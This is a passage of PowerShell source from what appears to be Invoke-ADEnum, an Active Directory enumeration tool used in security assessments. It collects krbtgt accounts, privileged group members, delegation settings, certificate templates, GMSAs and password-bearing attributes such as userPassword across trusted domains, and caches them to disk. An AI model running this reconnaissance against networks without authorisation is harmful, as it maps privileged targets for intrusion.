	foreach($TrustTargetName in $TrustTargetNames){
		$AllDomains += $TrustTargetName
	}
	
	$AllDomains = $AllDomains | Sort-Object -Unique
	
	$PlaceHolderDomains = $AllDomains
	$AllDomains = $AllDomains | Where-Object { $_ -notin $OutboundTrusts }
	
	if($Exclude){
		$ExcludeDomains = @($Exclude -split ',')
		$AllDomains = $AllDomains | Where-Object { $_ -notin $ExcludeDomains }
	}
	
	if(!$IncludeUnreachable){
		### Remove Unreachable domains

		$ReachableDomains = $AllDomains

		foreach($AllDomain in $AllDomains){
			$ReachableResult = $null
			$DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $AllDomain)
			$ReachableResult = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
			if($ReachableResult){}
			else{$ReachableDomains = $ReachableDomains | Where-Object { $_ -ne $AllDomain }}
		}
	}
	
	if($Domain){$AllDomains = $Domain}
	else{
		if(!$IncludeUnreachable){$AllDomains = $ReachableDomains}
		
		if($AllDomains -eq $null){
			Write-Host ""
			Write-Host " [-] No Domains in scope" -ForegroundColor Red
			Write-Host ""
			break
		}
	}
	
	if($SaveToDisk){
		# Create Folders
		if(!(Test-Path c:\Users\Public\Documents\Invoke-ADEnum)){
			New-Item -Path c:\Users\Public\Documents\Invoke-ADEnum -ItemType Directory -Force > $null
		}
		
		# Save Domains into file
		$AllDomains | ConvertTo-Json | Out-File -FilePath c:\Users\Public\Documents\Invoke-ADEnum\Domains.json
	}
	
	$inactiveThreshold = (Get-Date).AddMonths(-6)

	#############################################################################
    ############# List to all domain policies to avoid getting stuck ################
	#############################################################################

 	foreach($AllDomain in $AllDomains){
		$UnlocksysvolPath = "\\$AllDomain\SYSVOL\$AllDomain\Policies"
		ls $UnlocksysvolPath | Out-Null
	}

 	#############################################
    ############# Data Collection ################
	#############################################
	
	#Write-Host ""
    Write-Host ""
	if($LoadFromDisk){Write-Host "Loading Data..." -ForegroundColor Cyan}
    else{Write-Host "Data Collection in Progress..." -ForegroundColor Cyan}
	
	if($TargetsOnly){
		
		$ActiveDirectoryObjects = @()
		$TargetsOnlyCollection = @()
  
		if ($Domain -and $Server) {
			$ActiveDirectoryObjects += Collect-ADObjects -Domain $Domain -Server $Server -Collect DomainControllers
			$TargetsOnlyCollection += Collect-ADObjects -Domain $Domain -Server $Server -Collect Users -Property samaccounttype,userAccountControl,samaccountname
			$TargetsOnlyCollection += Collect-ADObjects -Domain $Domain -Server $Server -Collect Computers -Property samaccounttype,userAccountControl,samaccountname,operatingSystem
		}
		
		else{
			foreach($AllDomain in $AllDomains){
				$ActiveDirectoryObjects += Collect-ADObjects -Domain $AllDomain -Collect DomainControllers
				$TargetsOnlyCollection += Collect-ADObjects -Domain $AllDomain -Collect Users -Property samaccounttype,userAccountControl,samaccountname
				$TargetsOnlyCollection += Collect-ADObjects -Domain $AllDomain -Collect Computers -Property samaccounttype,userAccountControl,samaccountname,operatingSystem
			}
		}
		
		# All Users
		$TotalEnabledDisabledUsers = @($TargetsOnlyCollection | Where-Object { $_.samaccounttype -eq 805306368 })
		
		# Enabled Users
		$TotalEnabledUsers = @($TargetsOnlyCollection | Where-Object { $_.samaccounttype -eq 805306368 -and ([int]$_.userAccountControl -band 2) -eq 0 })

		# Disabled Users
		$TotalDisabledUsers = @($TargetsOnlyCollection | Where-Object { $_.samaccounttype -eq 805306368 -and ([int]$_.userAccountControl -band 2) -ne 0 })

		# All Computers
		$TotalEnabledDisabledMachines = @($TargetsOnlyCollection | Where-Object { $_.samaccounttype -eq 805306369 })
		
		# Enabled Computers
		$TotalEnabledMachines = @($TargetsOnlyCollection | Where-Object { $_.samaccounttype -eq 805306369 -and ([int]$_.userAccountControl -band 2) -eq 0 })

		# Disabled Computers
		$TotalDisabledMachines = @($TargetsOnlyCollection | Where-Object { $_.samaccounttype -eq 805306369 -and ([int]$_.userAccountControl -band 2) -ne 0 })

		# Enabled Servers including Domain Controllers
		$TotalEnabledServers = @($TargetsOnlyCollection | Where-Object { $_.samaccounttype -eq 805306369 -and $_.operatingSystem -like '*Server*' -and ([int]$_.userAccountControl -band 2) -eq 0 })

		# Disabled Servers including Domain Controllers
		$TotalDisabledServers = @($TargetsOnlyCollection | Where-Object { $_.samaccounttype -eq 805306369 -and $_.operatingSystem -like '*Server*' -and ([int]$_.userAccountControl -band 2) -ne 0 })

		# Enabled Workstations
		$TotalEnabledWorkstations = @($TargetsOnlyCollection | Where-Object { $_.samaccounttype -eq 805306369 -and ($_.operatingSystem -notlike '*Server*') -and ([int]$_.userAccountControl -band 2) -eq 0 })

		# Disabled Workstations
		$TotalDisabledWorkstations = @($TargetsOnlyCollection | Where-Object { $_.samaccounttype -eq 805306369 -and ($_.operatingSystem -notlike '*Server*') -and ([int]$_.userAccountControl -band 2) -ne 0 })
		
		# Domain Policies
		$DomainPolicy = $ActiveDirectoryObjects | Where-Object { $_.objectClass -contains 'domainDNS' }
		
		# krbtgt
		$AllkrbtgtAccounts = @($ActiveDirectoryObjects | Where-Object { $_.name -eq 'krbtgt' })
		
		# Domain Controllers
		$TotalDomainControllers = @($ActiveDirectoryObjects | Where-Object { $_.objectCategory -like '*Computer*' -and ([int]$_.userAccountControl -band 8192) -eq 8192 } | Sort-Object -Unique -Property domain,dnshostname)
		
		# RIDRole DCs
		$ridManager = @($ActiveDirectoryObjects | Where-Object { $_.objectClass -contains 'rIDManager' } | Sort-Object -Unique -Property domain,name)
		$fsmoRoleOwnerDN = @($ridManager.fSMORoleOwner)
		$dcDNs = @($fsmoRoleOwnerDN -replace '^CN=NTDS Settings,')
		$ExtrDCs = @()
		foreach($dcDN in $dcDNs){$ExtrDCs += ($dcDN -split ',')[0] -replace 'CN=', ''}
		$RIDRoleDCs = @()
		#foreach($ExtrDC in $ExtrDCs){$RIDRoleDCs += $TotalDomainControllers | Where-Object { $_.name -like "$ExtrDC*"}}
		$RIDRoleDCs += $TotalDomainControllers | Where-Object { $ExtrDCs -contains $_.name }
		
		# All Policies
		$PolicyTargets = $ActiveDirectoryObjects | Where-Object {$_.distinguishedname -like "CN=Policies*"}
	}
	
	else{
		$ActiveDirectoryObjects = @()
		$TotalEnabledUsers = @()
		$TotalDisabledUsers = @()
		$TotalEnabledDisabledUsers = @()
		$TotalEnabledMachines = @()
		$TotalDisabledMachines = @()
		$TotalEnabledServers = @()
		$TotalDisabledServers = @()
		$TotalEnabledWorkstations = @()
		$TotalDisabledWorkstations = @()
		$TotalEnabledDisabledMachines = @()
		$TotalGroups = @()
		$AllCollectedGPOs = @()
		$AllCollectedOUs = @()
		$CollectEverythingElse = @()
		$AllkrbtgtAccounts = @()
		$TotalDomainControllers = @()
		$AllCertTemplates = @()
		$PrintersCollection = @()
		$DomainPolicy = @()
		$PolicyTargets = @()
		$CollectrIDManagers = @()
		$AllForeignSecurityPrincipals = @()
		$CollectGMSAs = @()
		$CollectSCCMServers = @()
		$AllDomainTrusts = @()
		$AllSubnets = @()
		$AllGUIDMappings = @{}
		
		if($LoadFromDisk){
			$CatchTheError = $false
			$ErrorActionPreference = "Stop"
			try{$AllkrbtgtAccounts = Get-Content -Path c:\Users\Public\Documents\Invoke-ADEnum\krbtgtAccounts.json -Raw | ConvertFrom-Json}catch{Write-Output "Could not load krbtgtAccounts.json";$CatchTheError = $true}
			try{$TotalDomainControllers = Get-Content -Path c:\Users\Public\Documents\Invoke-ADEnum\DomainControllers.json -Raw | ConvertFrom-Json}catch{Write-Output "Could not load DomainControllers.json";$CatchTheError = $true}
			try{$CollectrIDManagers = Get-Content -Path c:\Users\Public\Documents\Invoke-ADEnum\rIDManagers.json -Raw | ConvertFrom-Json}catch{Write-Output "Could not load rIDManagers.json";$CatchTheError = $true}
			try{$DomainPolicy = Get-Content -Path c:\Users\Public\Documents\Invoke-ADEnum\DomainPolicy.json -Raw | ConvertFrom-Json}catch{Write-Output "Could not load DomainPolicy.json";$CatchTheError = $true}
			try{$PolicyTargets = Get-Content -Path c:\Users\Public\Documents\Invoke-ADEnum\PolicyTargets.json -Raw | ConvertFrom-Json}catch{Write-Output "Could not load PolicyTargets.json";$CatchTheError = $true}
			try{$TotalEnabledUsers = Get-Content -Path c:\Users\Public\Documents\Invoke-ADEnum\EnabledUsers.json -Raw | ConvertFrom-Json}catch{Write-Output "Could not load EnabledUsers.json";$CatchTheError = $true}
			try{$TotalDisabledUsers = Get-Content -Path c:\Users\Public\Documents\Invoke-ADEnum\DisabledUsers.json -Raw | ConvertFrom-Json}catch{Write-Output "Could not load DisabledUsers.json";$CatchTheError = $true}
			$TotalEnabledDisabledUsers += @($TotalEnabledUsers + $TotalDisabledUsers)
			try{$AllForeignSecurityPrincipals = Get-Content -Path c:\Users\Public\Documents\Invoke-ADEnum\ForeignSecurityPrincipals.json -Raw | ConvertFrom-Json}catch{Write-Output "Could not load ForeignSecurityPrincipals.json";$CatchTheError = $true}
			try{$TotalEnabledMachines = Get-Content -Path c:\Users\Public\Documents\Invoke-ADEnum\EnabledMachines.json -Raw | ConvertFrom-Json}catch{Write-Output "Could not load EnabledMachines.json";$CatchTheError = $true}
			try{$TotalDisabledMachines = Get-Content -Path c:\Users\Public\Documents\Invoke-ADEnum\DisabledMachines.json -Raw | ConvertFrom-Json}catch{Write-Output "Could not load DisabledMachines.json";$CatchTheError = $true}
			$TotalEnabledDisabledMachines += @($TotalEnabledMachines + $TotalDisabledMachines)
			$TotalEnabledServers += @($TotalEnabledMachines | Where-Object { $_.operatingSystem -like '*Server*'})
			$TotalDisabledServers += @($TotalDisabledMachines | Where-Object { $_.operatingSystem -like '*Server*'})
			$TotalEnabledWorkstations += @($TotalEnabledMachines | Where-Object { $_.operatingSystem -notlike '*Server*'})
			$TotalDisabledWorkstations += @($TotalDisabledMachines | Where-Object { $_.operatingSystem -notlike '*Server*'})
			try{$CollectGMSAs = Get-Content -Path c:\Users\Public\Documents\Invoke-ADEnum\GMSAs.json -Raw | ConvertFrom-Json}catch{Write-Output "Could not load GMSAs.json";$CatchTheError = $true}
			try{$CollectSCCMServers = Get-Content -Path c:\Users\Public\Documents\Invoke-ADEnum\SCCMServers.json -Raw | ConvertFrom-Json}catch{Write-Output "Could not load SCCMServers.json";$CatchTheError = $true}
			try{$PrintersCollection = Get-Content -Path c:\Users\Public\Documents\Invoke-ADEnum\Printers.json -Raw | ConvertFrom-Json}catch{Write-Output "Could not load Printers.json";$CatchTheError = $true}
			try{$TotalGroups = Get-Content -Path c:\Users\Public\Documents\Invoke-ADEnum\Groups.json -Raw | ConvertFrom-Json}catch{Write-Output "Could not load Groups.json";$CatchTheError = $true}
			try{$AllCollectedGPOs = Get-Content -Path c:\Users\Public\Documents\Invoke-ADEnum\GPOs.json -Raw | ConvertFrom-Json}catch{Write-Output "Could not load GPOs.json";$CatchTheError = $true}
			try{$AllCollectedOUs = Get-Content -Path c:\Users\Public\Documents\Invoke-ADEnum\OUs.json -Raw | ConvertFrom-Json}catch{Write-Output "Could not load OUs.json";$CatchTheError = $true}
			try{$AllCertTemplates = Get-Content -Path c:\Users\Public\Documents\Invoke-ADEnum\CertTemplates.json -Raw | ConvertFrom-Json}catch{Write-Output "Could not load CertTemplates.json";$CatchTheError = $true}
			try{$AllDomainTrusts = Get-Content -Path c:\Users\Public\Documents\Invoke-ADEnum\DomainTrusts.json -Raw | ConvertFrom-Json}catch{Write-Output "Could not load DomainTrusts.json";$CatchTheError = $true}
			try{$AllSubnets = Get-Content -Path c:\Users\Public\Documents\Invoke-ADEnum\Subnets.json -Raw | ConvertFrom-Json}catch{Write-Output "Could not load Subnets.json";$CatchTheError = $true}
			if($CatchTheError){Stop-Transcript | Out-Null;Write-Output "";break}else{$ErrorActionPreference = "SilentlyContinue"}
		}
		else{
			if ($Domain -and $Server) {
				Write-Output "[*] Collecting Krbtgt..."
					
				# krbtgt
				$AllkrbtgtAccounts += @(Collect-ADObjects -Domain $Domain -Server $Server -Identity krbtgt -Property samaccountname,objectsid,whencreated,pwdlastset,serviceprincipalname)
				
				Write-Output "[*] Collecting Domain Trusts..."
				
				# Domain Trusts
				$AllDomainTrusts += FindDomainTrusts -Domain $Domain
				
				Write-Output "[*] Collecting Domain Controllers..."
				
				# Domain Controllers
				$TotalDomainControllers += @(Collect-ADObjects -Domain $Domain -Server $Server -Collect DomainControllers -Property name,dnshostname,operatingsystem)
				
				# rIDManagers
				$CollectrIDManagers += @(Collect-ADObjects -Domain $Domain -Server $Server -Collect rIDManagers -Property name,fSMORoleOwner)
				
				Write-Output "[*] Collecting Policies..."
				
				# Domain Policies
				$DomainPolicy += @(Collect-ADObjects -Domain $Domain -Server $Server -Collect DomainPolicy -Property minPwdAge,maxPwdAge,pwdProperties,minPwdLength,pwdHistoryLength,lockoutThreshold,ms-ds-machineaccountquota)
				
				# All Policies
				$PolicyTargets += @(Collect-ADObjects -Domain $Domain -Server $Server -Collect OtherPolicies -Property distinguishedname)
				
				Write-Output "[*] Collecting Users..."
				
				# Enabled Users
				$TotalEnabledUsers += @(Collect-ADObjects -Domain $Domain -Server $Server -Collect Users -Enabled -Property name,objectClass,objectCategory,distinguishedName,samaccountname,objectsid,lastlogontimestamp,pwdlastset,cn,memberof,admincount,serviceprincipalname,sidHistory,description,objectGuid,samAccountType,displayname,userPassword,unixUserPassword,homedirectory,msds-allowedtodelegateto,userAccountControl)

				# Disabled Users
				$TotalDisabledUsers += @(Collect-ADObjects -Domain $Domain -Server $Server -Collect Users -Disabled -Property samaccountname)
				
				# All Users
				$TotalEnabledDisabledUsers += @($TotalEnabledUsers + $TotalDisabledUsers)
				
				# Foreign Members
				$AllForeignSecurityPrincipals += @(Collect-ADObjects -Domain $Domain -Server $Server -LDAP "(&(objectCategory=foreignSecurityPrincipal)(CN=S-1-5-21*))")
				
				Write-Output "[*] Collecting Machines..."
				
				# Enabled Computers
				$TotalEnabledMachines += @(Collect-ADObjects -Domain $Domain -Server $Server -Collect Computers -Enabled -Property name,objectClass,objectCategory,distinguishedName,samaccountname,objectsid,lastlogontimestamp,pwdlastset,cn,operatingsystem,DnsHostName,memberof,admincount,serviceprincipalname,ms-DS-CreatorSID,description,samAccountType,displayname,ms-Mcs-AdmPwdExpirationTime,msds-allowedtodelegateto,whencreated,userAccountControl,msDS-AllowedToActOnBehalfOfOtherIdentity)

				# Disabled Computers
				$TotalDisabledMachines += @(Collect-ADObjects -Domain $Domain -Server $Server -Collect Computers -Disabled -Property samaccountname,operatingsystem,dnshostname,name)
				
				# All Computers
				$TotalEnabledDisabledMachines += @($TotalEnabledMachines + $TotalDisabledMachines)

				# Enabled Servers including Domain Controllers
				$TotalEnabledServers += @($TotalEnabledMachines | Where-Object { $_.operatingSystem -like '*Server*'})

				# Disabled Servers including Domain Controllers
				$TotalDisabledServers += @($TotalDisabledMachines | Where-Object { $_.operatingSystem -like '*Server*'})

				# Enabled Workstations
				$TotalEnabledWorkstations += @($TotalEnabledMachines | Where-Object { $_.operatingSystem -notlike '*Server*'})

				# Disabled Workstations
				$TotalDisabledWorkstations += @($TotalDisabledMachines | Where-Object { $_.operatingSystem -notlike '*Server*'})
				
				# GMSA
				$CollectGMSAs += @(Collect-ADObjects -Domain $Domain -Server $Server -LDAP "objectClass=msDS-GroupManagedServiceAccount" -Property samaccountname,lastlogontimestamp,msds-managedpasswordinterval,pwdlastset,objectSID,objectGuid)
				
				# Collect SCCM Servers
				$CollectSCCMServers += @(Collect-ADObjects -Domain $Domain -Server $Server -LDAP "objectClass=mSSMSManagementPoint" -Property mssmsmpname)
				
				# Printers
				$PrintersCollection += @(Collect-ADObjects -Domain $Domain -Server $Server -Collect Printers -Property servername,shortservername,printsharename,portname,drivername,url)
				
				Write-Output "[*] Collecting Groups..."
				
				# All Groups
				$TotalGroups += @(Collect-ADObjects -Domain $Domain -Server $Server -Collect Groups -Property name,objectClass,objectCategory,member,distinguishedName,samaccountname,objectsid,cn,memberof,admincount,description)
				
				Write-Output "[*] Collecting GPOs..."
				
				# All GPOs
				$AllCollectedGPOs += @(Collect-ADObjects -Domain $Domain -Server $Server -Collect GPOs -Property gpcfilesyspath,displayname,cn,distinguishedname,name)
				
				Write-Output "[*] Collecting OUs..."
				
				# All OUs
				$AllCollectedOUs += @(Collect-ADObjects -Domain $Domain -Server $Server -Collect OUs -Property gplink,name,distinguishedname)
				
				Write-Output "[*] Collecting Certificate Templates..."
				
				# Cert Templates
				if(!$NoVulnCertTemplates){$AllCertTemplates += @(Collect-ADCertificateTemplates -Domain $Domain -Server $Server)}
				
				Write-Output "[*] Collecting Subnets..."
		
				# Subnets
				$AllSubnets = Subnets -Domain $Domain
			}
			
			else{	
				Write-Output "[*] Collecting Krbtgt..."
				
				# krbtgt
				foreach($AllDomain in $AllDomains){
					$AllkrbtgtAccounts += @(Collect-ADObjects -Domain $AllDomain -Identity krbtgt -Property samaccountname,objectsid,whencreated,pwdlastset,serviceprincipalname)
				}
				
				Write-Output "[*] Collecting Domain Trusts..."
			
				# Domain Trusts
				foreach($AllDomain in $AllDomains){
					$AllDomainTrusts += FindDomainTrusts -Domain $AllDomain
				}
				
				Write-Output "[*] Collecting Domain Controllers..."
				
				# Domain Controllers
				foreach($AllDomain in $AllDomains){
					$TotalDomainControllers += @(Collect-ADObjects -Domain $AllDomain -Collect DomainControllers -Property name,dnshostname,operatingsystem)
				}
				
				# rIDManagers
				foreach($AllDomain in $AllDomains){
					$CollectrIDManagers += @(Collect-ADObjects -Domain $AllDomain -Collect rIDManagers -Property name,fSMORoleOwner)
				}
				
				Write-Output "[*] Collecting Policies..."
				
				# Domain Policies
				foreach($AllDomain in $AllDomains){
					$DomainPolicy += @(Collect-ADObjects -Domain $AllDomain -Collect DomainPolicy -Property minPwdAge,maxPwdAge,pwdProperties,minPwdLength,pwdHistoryLength,lockoutThreshold,ms-ds-machineaccountquota)
				}
				
				# All Policies
				foreach($AllDomain in $AllDomains){
					$PolicyTargets += @(Collect-ADObjects -Domain $AllDomain -Collect OtherPolicies -Property distinguishedname)
				}
				
				Write-Output "[*] Collecting Users..."
				
				# Enabled Users
				foreach($AllDomain in $AllDomains){
					$TotalEnabledUsers += @(Collect-ADObjects -Domain $AllDomain -Collect Users -Enabled -Property name,objectClass,objectCategory,distinguishedName,samaccountname,objectsid,lastlogontimestamp,pwdlastset,cn,memberof,admincount,serviceprincipalname,sidHistory,description,objectGuid,samAccountType,displayname,userPassword,unixUserPassword,homedirectory,msds-allowedtodelegateto,userAccountControl)
				}

				# Disabled Users
				foreach($AllDomain in $AllDomains){
					$TotalDisabledUsers += @(Collect-ADObjects -Domain $AllDomain -Collect Users -Disabled -Property samaccountname)
				}
				
				# All Users
				$TotalEnabledDisabledUsers += @($TotalEnabledUsers + $TotalDisabledUsers)
				
				# Foreign Members
				foreach($AllDomain in $AllDomains){
					$AllForeignSecurityPrincipals += @(Collect-ADObjects -Domain $AllDomain -LDAP "(&(objectCategory=foreignSecurityPrincipal)(CN=S-1-5-21*))")
				}
				
				Write-Output "[*] Collecting Machines..."
				
				# Enabled Computers
				foreach($AllDomain in $AllDomains){
					$TotalEnabledMachines += @(Collect-ADObjects -Domain $AllDomain -Collect Computers -Enabled -Property name,objectClass,objectCategory,distinguishedName,samaccountname,objectsid,lastlogontimestamp,pwdlastset,cn,operatingsystem,DnsHostName,memberof,admincount,serviceprincipalname,ms-DS-CreatorSID,description,samAccountType,displayname,ms-Mcs-AdmPwdExpirationTime,msds-allowedtodelegateto,whencreated,userAccountControl,msDS-AllowedToActOnBehalfOfOtherIdentity)
				}

				# Disabled Computers
				foreach($AllDomain in $AllDomains){
					$TotalDisabledMachines += @(Collect-ADObjects -Domain $AllDomain -Collect Computers -Disabled -Property samaccountname,operatingsystem,dnshostname,name)
				}
				
				# All Computers
				$TotalEnabledDisabledMachines += @($TotalEnabledMachines + $TotalDisabledMachines)

				# Enabled Servers including Domain Controllers
				$TotalEnabledServers += @($TotalEnabledMachines | Where-Object { $_.operatingSystem -like '*Server*'})

				# Disabled Servers including Domain Controllers
				$TotalDisabledServers += @($TotalDisabledMachines | Where-Object { $_.operatingSystem -like '*Server*'})

				# Enabled Workstations
				$TotalEnabledWorkstations += @($TotalEnabledMachines | Where-Object { $_.operatingSystem -notlike '*Server*'})

				# Disabled Workstations
				$TotalDisabledWorkstations += @($TotalDisabledMachines | Where-Object { $_.operatingSystem -notlike '*Server*'})
				
				# GMSA
				foreach($AllDomain in $AllDomains){
					$CollectGMSAs += @(Collect-ADObjects -Domain $AllDomain -LDAP "objectClass=msDS-GroupManagedServiceAccount" -Property samaccountname,lastlogontimestamp,msds-managedpasswordinterval,pwdlastset,objectSID,objectGuid)
				}
				
				# Collect SCCM Servers
				foreach($AllDomain in $AllDomains){
					$CollectSCCMServers += @(Collect-ADObjects -Domain $AllDomain -LDAP "objectClass=mSSMSManagementPoint" -Property mssmsmpname)
				}
				
				# Printers
				foreach($AllDomain in $AllDomains){
					$PrintersCollection += @(Collect-ADObjects -Domain $AllDomain -Collect Printers -Property servername,shortservername,printsharename,portname,drivername,url)
				}
				
				Write-Output "[*] Collecting Groups..."
				
				# All Groups
				foreach($AllDomain in $AllDomains){
					$TotalGroups += @(Collect-ADObjects -Domain $AllDomain -Collect Groups -Property name,objectClass,objectCategory,member,distinguishedName,samaccountname,objectsid,cn,memberof,admincount,description)
				}
				
				Write-Output "[*] Collecting GPOs..."
				
				# All GPOs
				foreach($AllDomain in $AllDomains){
					$AllCollectedGPOs += @(Collect-ADObjects -Domain $AllDomain -Collect GPOs -Property gpcfilesyspath,displayname,cn,distinguishedname,name)
				}
				
				Write-Output "[*] Collecting OUs..."
				
				# All OUs
				foreach($AllDomain in $AllDomains){
					$AllCollectedOUs += @(Collect-ADObjects -Domain $AllDomain -Collect OUs -Property gplink,name,distinguishedname)
				}
				
				Write-Output "[*] Collecting Certificate Templates..."
				
				# Cert Templates
				foreach($AllDomain in $AllDomains){
					if(!$NoVulnCertTemplates){$AllCertTemplates += @(Collect-ADCertificateTemplates -Domain $AllDomain)}
				}
				
				Write-Output "[*] Collecting Subnets..."
		
				# Subnets
				$AllSubnets = foreach($AllDomain in $AllDomains){
					Subnets -Domain $AllDomain
				}
			}
		}
		
		#$ActiveDirectoryObjects = @($TotalEnabledDisabledUsers + $TotalEnabledDisabledMachines + $TotalGroups + $AllCollectedGPOs + $AllCollectedOUs + $CollectEverythingElse)
		
		# All GUIDs Mappings
		if($LoadFromDisk){
			# Import the JSON data from the file
			$jsonData = Get-Content -Path c:\Users\Public\Documents\Invoke-ADEnum\GUIDMappings.json -Raw | ConvertFrom-Json
			foreach ($guiddomain in $jsonData.PSObject.Properties.Name) {
				$AllGUIDMappings[$guiddomain] = @{}
				$domainData = $jsonData.$guiddomain
				
				foreach ($guid in $domainData.PSObject.Properties.Name) {
					$guidKey = [Guid]::Parse($guid)
					$AllGUIDMappings[$guiddomain][$guidKey] = $domainData.$guid
				}
			}
		}
		
		else{
			Write-Output "[*] Collecting GUID Mappings..."
			if ($Domain -and $Server) {
				$AllGUIDMappings[$Domain] = Get-ADGuidMapping -Domain $Domain -Server $Server
			}
			else{
				foreach ($AllDomain in $AllDomains) {
					$AllGUIDMappings[$AllDomain] = Get-ADGuidMapping -Domain $AllDomain
				}
			}
			
			if($SaveToDisk){
				# Convert the hash table keys to strings
				$TransformedGUIDMappings = @{}
				foreach ($guiddomain in $AllGUIDMappings.Keys) {
					$TransformedGUIDMappings[$guiddomain] = @{}
					foreach ($guid in $AllGUIDMappings[$guiddomain].Keys) {
						$TransformedGUIDMappings[$guiddomain][$guid.ToString()] = $AllGUIDMappings[$guiddomain][$guid]
					}
				}
				$TransformedGUIDMappings | ConvertTo-Json | Out-File -FilePath c:\Users\Public\Documents\Invoke-ADEnum\GUIDMappings.json
			}
		}
		
		## PARSING
		#if(!$LoadFromDisk){Write-Output "[*] Parsing Data..."}
		
		# All Groups, Users and Computers
		$SumGroupsUsers = @($TotalGroups + $TotalEnabledUsers + $TotalEnabledMachines + $AllForeignSecurityPrincipals)
		
		# Protected users
		$ProtectedUsers = @(RecursiveGroupMembers -AllADObjects $SumGroupsUsers -Raw -Identity "Protected Users")
		
		# Sensitive users
		$SensitiveUsers = @($SumGroupsUsers | Where-Object { $_.useraccountcontrol -band 1048576 })
		
		Write-Output "[*] Parsing Admin Groups members..."
		
		# DA, EA, Built-In Admins
		
		$DAEABAGroups = @(
		'Administrators',
		'Enterprise Admins',
		'Domain Admins'
		)
		
		$DAEABA = @()
		$TempDAEABA = @()
		
		foreach ($Group in $DAEABAGroups) {
			$TempDAEABA += RecursiveGroupMembers -AllADObjects $SumGroupsUsers -Raw -Identity $Group |
				Group-Object domain, samaccountname |  # Group by domain and samaccountname
				ForEach-Object { $_.Group | Select-Object -First 1 }  # Select the first object from each group
		}

		# To ensure uniqueness across the entire collection
		$DAEABA = @($TempDAEABA | Group-Object domain, samaccountname | ForEach-Object { $_.Group | Select-Object -First 1 })
		
		Write-Output "[*] Parsing Security Groups Members..."
		
		# Security Groups Users
		
		$AllSecurityGroups = @(
			'Account Operators',
			'Backup Operators',
			'Cert Publishers',
			'DNSAdmins',
			'Distributed COM Users',
			'Domain Controllers',
			'Enterprise Key Admins',
			'Enterprise Read-Only Domain Controllers',
			'Group Policy Creator Owners',
			'Key Admins',
			'Organization Management',
			'Performance Log Users',
			'Print Operators',
			'Read-Only Domain Controllers',
			'Remote Desktop Users',
			'Remote Management Users',
			'Replicator',
			'Schema Admins',
			'Server Operators'
		)
		
		$AllSecurityUsers = @()
		$TempAllSecurityUsers = @()
		
		$TempAllSecurityUsers = foreach ($Group in $AllSecurityGroups) {
			RecursiveGroupMembers -AllADObjects $SumGroupsUsers -Raw -Identity $Group |
				Group-Object domain, samaccountname |  # Group by domain and samaccountname
				ForEach-Object { $_.Group | Select-Object -First 1 }  # Select the first object from each group
		}

		# To ensure uniqueness across the entire collection
		$AllSecurityUsers = @($TempAllSecurityUsers | Group-Object domain, samaccountname | ForEach-Object { $_.Group | Select-Object -First 1 })
		
		# Admin Count Users
		$AllAdminCountUsers = @($TotalEnabledUsers | Where-Object { $_.admincount -eq 1 })
		
		Write-Output "[*] Parsing RIDRole DCs..."
		
		# RIDRole DCs
		$ridManager = @($CollectrIDManagers | Sort-Object -Unique -Property domain,fsmoroleowner)
		$fsmoRoleOwnerDN = @($ridManager.fSMORoleOwner)
		$dcDNs = @($fsmoRoleOwnerDN -replace '^CN=NTDS Settings,')
		$ExtrDCs = @()
		foreach($dcDN in $dcDNs){$ExtrDCs += ($dcDN -split ',')[0] -replace 'CN=', ''}
		$RIDRoleDCs = @()
		$RIDRoleDCs += $TotalDomainControllers | Where-Object { $ExtrDCs -contains $_.name }
		
		if($SaveToDisk){
			$AllkrbtgtAccounts | ConvertTo-Json | Out-File -FilePath c:\Users\Public\Documents\Invoke-ADEnum\krbtgtAccounts.json
			$TotalDomainControllers | ConvertTo-Json | Out-File -FilePath c:\Users\Public\Documents\Invoke-ADEnum\DomainControllers.json
			$CollectrIDManagers | ConvertTo-Json | Out-File -FilePath c:\Users\Public\Documents\Invoke-ADEnum\rIDManagers.json
			$DomainPolicy | ConvertTo-Json | Out-File -FilePath c:\Users\Public\Documents\Invoke-ADEnum\DomainPolicy.json
			$PolicyTargets | ConvertTo-Json | Out-File -FilePath c:\Users\Public\Documents\Invoke-ADEnum\PolicyTargets.json
			$TotalEnabledUsers | ConvertTo-Json | Out-File -FilePath c:\Users\Public\Documents\Invoke-ADEnum\EnabledUsers.json
			$TotalDisabledUsers | ConvertTo-Json | Out-File -FilePath c:\Users\Public\Documents\Invoke-ADEnum\DisabledUsers.json
			$AllForeignSecurityPrincipals | ConvertTo-Json | Out-File -FilePath c:\Users\Public\Documents\Invoke-ADEnum\ForeignSecurityPrincipals.json
			$TotalEnabledMachines | ConvertTo-Json | Out-File -FilePath c:\Users\Public\Documents\Invoke-ADEnum\EnabledMachines.json
			$TotalDisabledMachines | ConvertTo-Json | Out-File -FilePath c:\Users\Public\Documents\Invoke-ADEnum\DisabledMachines.json
			$CollectGMSAs | ConvertTo-Json | Out-File -FilePath c:\Users\Public\Documents\Invoke-ADEnum\GMSAs.json
			$CollectSCCMServers | ConvertTo-Json | Out-File -FilePath c:\Users\Public\Documents\Invoke-ADEnum\SCCMServers.json
			$PrintersCollection | ConvertTo-Json | Out-File -FilePath c:\Users\Public\Documents\Invoke-ADEnum\Printers.json
			$TotalGroups | ConvertTo-Json | Out-File -FilePath c:\Users\Public\Documents\Invoke-ADEnum\Groups.json
			$AllCollectedGPOs | ConvertTo-Json | Out-File -FilePath c:\Users\Public\Documents\Invoke-ADEnum\GPOs.json
			$AllCollectedOUs | ConvertTo-Json | Out-File -FilePath c:\Users\Public\Documents\Invoke-ADEnum\OUs.json
			$AllCertTemplates | ConvertTo-Json | Out-File -FilePath c:\Users\Public\Documents\Invoke-ADEnum\CertTemplates.json
			$AllDomainTrusts | ConvertTo-Json | Out-File -FilePath c:\Users\Public\Documents\Invoke-ADEnum\DomainTrusts.json
			$AllSubnets | ConvertTo-Json | Out-File -FilePath c:\Users\Public\Documents\Invoke-ADEnum\Subnets.json
		}
	}
	
	#############################################
    ############# Target Domains ################
	#############################################
	
    Write-Host ""
    Write-Host ""
    Write-Host "Target Domains" -ForegroundColor Cyan

    $functionalLevelMapping = @{
	    0 = 'Windows 2000 Native'
	    1 = 'Windows Server 2003 Interim'
	    2 = 'Windows Server 2003'
	    3 = 'Windows Server 2008'
	    4 = 'Windows Server 2008 R2'
	    5 = 'Windows Server 2012'
	    6 = 'Windows Server 2012 R2'
	    7 = 'Windows Server 2016'
	    8 = 'Windows Server 2019'
	}
	
	Add-Type -AssemblyName System.DirectoryServices.AccountManagement
    
